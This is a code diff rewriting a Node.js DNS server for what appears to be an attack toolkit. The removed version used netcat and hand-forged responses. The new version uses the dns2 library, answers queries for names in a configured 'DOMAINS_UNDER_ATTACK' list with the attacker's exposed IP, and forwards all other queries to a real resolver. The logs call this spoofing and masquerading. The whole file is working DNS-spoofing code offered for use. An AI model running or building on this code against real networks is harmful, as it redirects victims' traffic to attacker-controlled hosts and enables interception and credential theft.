@@ -1,69 +1,82 @@
-const https_server = require("./https_server");
-const NetcatServer = require('netcat/server');
-const NetcatClient = require('netcat/client');
+const dns2 = require('dns2');
 
-
-function forge_DNS_response(query, ip, expiration) {
-
-    let [ip_a, ip_b, ip_c, ip_d] = ip.split(".").map(e => Number.parseInt(e));
-
-    let ex_a = expiration >> 12;
-    let ex_b = expiration >> 8 & 0xFF;
-    let ex_c = expiration >> 4 & 0xFF;
-    let ex_d = expiration & 0xFF;
-
-    let response = new Uint8Array(query.length + 16);
-    response.set(query, 0)
-    response.set([0x81, 0x80, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00], 2)
-    response.set([0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, ex_a, ex_b, ex_c, ex_d, 0x00, 0x04, ip_a, ip_b, ip_c, ip_d], query.length)
-
-    return response;
-
-}
-
-function get_domain_from_DNS_query(buffer) {
-    let sections = [];
-    let url_section = buffer.slice(12);
-    while (url_section[0] != 0) {
-        let size = url_section[0];
-        sections.push(url_section.slice(1, size + 1).toString());
-        url_section = url_section.slice(size + 1)
-    }
-
-    return sections.join(".")
-}
+const { Packet } = dns2;
+const { UDPClient } = dns2;
+const resolve = UDPClient();
 
 const { GET_EXPOSED_IP, DOMAINS_UNDER_ATTACK, EXTERNAL_DNS } = require("../config");
 
-const nc = new NetcatServer()
-const server = nc.udp().port(53).listen();
+const boot = async () => {
 
-function proxify(rinfo, data) {
-    let client = new NetcatClient().udp().port(53).init().send(data, EXTERNAL_DNS);
-    client.on("data", ({ data, rinfo: dns_rinfo }) => {
-        server.port(rinfo.port).send(data, rinfo.address)
+    const server = dns2.createServer({
+        udp: true,
+        handle: async (request, send, rinfo) => {
+            const response = Packet.createResponseFromRequest(request);
+            const [question] = request.questions;
+            const { name } = question;
+
+
+            if (DOMAINS_UNDER_ATTACK.indexOf(name) == -1) {
+                console.log("proxifing   ", name)
+
+                const query = await resolve(name);
+                console.log(query);
+
+                response.answers.push(query.answers[0]);
+
+                send(response);
+            } else {
+                console.log("marcaradeing", name)
+
+                response.answers.push({
+                    name,
+                    type: Packet.TYPE.A,
+                    class: Packet.CLASS.IN,
+                    ttl: 300,
+                    address: await GET_EXPOSED_IP()
+                });
+                send(response);
+            }
+
+
+        }
     });
+
+    server.on('request', (request, response, rinfo) => {
+        console.log(request.header.id, request.questions[0]);
+    });
+
+    server.on('requestError', (error) => {
+        console.log('Client sent an invalid request', error);
+    });
+
+    server.on('listening', () => {
+        console.log(server.addresses());
+    });
+
+    server.on('close', () => {
+        console.log('server closed');
+    });
+
+    // TODO open multiple servers for every ip
+    (async () => {
+        server.listen({
+            // Optionally specify port, address and/or the family of socket() for udp server:
+            udp: {
+                port: 53,
+                address: await GET_EXPOSED_IP(),
+                type: "udp4",  // IPv4 or IPv6 (Must be either "udp4" or "udp6")
+            },
+
+            // Optionally specify port and/or address for tcp server:
+            tcp: {
+                port: 53,
+                address: await GET_EXPOSED_IP(),
+            },
+        });
+    })()
+    // // eventually
+    // server.close();
 }
 
-server.on('data', async function (rinfo, data) {
-    const EXPOSED_IP = await GET_EXPOSED_IP()
-
-    let domain = get_domain_from_DNS_query(data);
-    if (DOMAINS_UNDER_ATTACK.indexOf(domain) == -1) {
-        console.log("dns not spoofed for", domain);
-        proxify(rinfo, data);
-        return;
-    }
-    console.log("dns spoofed for", domain, "at", EXPOSED_IP);
-
-    server.port(rinfo.port).send(forge_DNS_response(data, EXPOSED_IP, 60), rinfo.address)
-
-})
-
-
-
-
-
-console.log("DNS up");
-
-
+module.exports = { boot };
